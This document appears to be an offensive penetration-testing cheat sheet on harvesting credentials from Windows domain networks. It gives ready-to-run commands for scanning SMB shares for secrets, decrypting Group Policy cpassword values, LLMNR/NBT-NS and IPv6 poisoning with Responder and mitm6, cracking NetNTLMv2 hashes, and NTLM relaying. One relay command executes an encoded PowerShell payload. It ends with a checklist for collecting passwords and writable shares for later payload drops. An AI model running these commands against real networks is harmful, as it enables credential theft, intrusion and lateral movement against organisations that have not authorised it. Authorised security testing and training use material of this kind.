title: Credentials in the Network
---

The fastest wins come from the network, not the hosts. File shares and broadcast traffic routinely leak credentials in forms you don't have to crack.

## Share Hunting

SMB shares across a domain are a mine of configs, deployment scripts, backups, and `passwords.xlsx` files. The tooling automates the regex search.

### Snaffler (Windows)

Domain-joined, enumerates shares via LDAP, grep-fuzzes them for secrets.

```powershell
# Discover and scan everything the current user can read
.\Snaffler.exe -s -o snaffler.log

# JSON output, verbose
.\Snaffler.exe -s -t -o snaffler.log

# Scope to a specific target
.\Snaffler.exe -s -i 10.10.10.10
```

Snaffler ranks findings `Red` (keys, hashes, cpassword) → `Yellow` → `Green`. Always triage Red first.

### MANSPIDER (Linux)

Same idea, run from your attacker box.

```bash
manspider //10.10.10.10/share -u bob -p 'Pass!' -c 'password|passwd|credential|api[_-]?key|secret'

# Scan a subnet
manspider 10.10.10.0/24 -u bob -p 'Pass!' -c password
```

### NetExec spider_plus

```bash
netexec smb 10.10.10.0/24 -u bob -p 'Pass!' -M spider_plus
# writes JSON to /tmp/nxc_spider_plus/ with file size, extensions, matched regexes
```

### What to grep for (cheat list)

```
password | passwd | pwd | creds | credential | secret
api[_-]?key | token | authorization | bearer
<ConnectionString | Data Source= | connect to
cpassword   (Group Policy Preferences)
BEGIN RSA PRIVATE KEY | BEGIN OPENSSH PRIVATE KEY
```

## Group Policy Preferences (`cpassword`)

Pre-2014 GPP XML files encrypted service account passwords with a Microsoft-published AES-256 key — decrypt instantly.

```bash
# Find on SYSVOL
find /mnt/sysvol -name '*.xml' -exec grep -l cpassword {} \;

# Decrypt
gpp-decrypt <cpassword-value>
```

Any authenticated domain user can read SYSVOL. If this ever worked once in the environment, assume residual XML.

## Credential Hunting in Traffic

### Responder — passive first

Responder in `Analyze` mode doesn't poison, just reports what's being requested on the LAN. Run it for 15 minutes before poisoning so you know what you're about to break.

```bash
sudo responder -I tun0 -A           # Analyze: watch, don't respond
sudo responder -I tun0 -wrf         # LLMNR + NBT-NS + mDNS poisoning (WPAD, HTTP server, SMB)
```

Captured NetNTLMv1/v2 hashes land in `/usr/share/responder/logs/`.

```bash
# Crack NetNTLMv2
hashcat -m 5600 netntlmv2.hash rockyou.txt

# Or relay instead of crack (needs SMB signing disabled on target)
sudo responder -I tun0 -wrf --lm --disable-ess
impacket-ntlmrelayx -tf targets.txt -smb2support -c 'powershell -enc <b64>'
```

### Pcredz — scrape plaintext from PCAPs

Pulls FTP/POP/IMAP/SMTP/HTTP basic/SNMP/Kerberos/NetNTLM credentials from live traffic or a PCAP.

```bash
# Live on an interface
sudo ./Pcredz -i tun0

# Offline from a capture
sudo ./Pcredz -f capture.pcapng -t -v
```

### Wireshark quick filters

```
ftp
telnet
http.request.method == "POST"
tcp.port == 1433        # MSSQL
smb2.cmd == 1           # SMB session setup — NTLM negotiation visible
```

## Credentials in LLMNR/NBT-NS/mDNS Responses

```bash
# Poisoning (needs same broadcast domain as victims)
sudo responder -I tun0 -wrf

# IPv6 version — more effective in modern networks
sudo mitm6 -d inlanefreight.local -i tun0
# pair with:
impacket-ntlmrelayx -6 -t ldaps://<DC> --delegate-access
```

## What Great Credential Hunters Collect

- Every username → users.txt (for spraying & kerbrute)
- Every password you ever see → passwords.txt (even "old" ones — people rotate predictably)
- Every service account → spns.txt (for Kerberoasting)
- Every file share with writable access → used later for payload drops
- Every intranet URL with a login form → added to the Burp target list

The output of this phase feeds every other module in the chain.
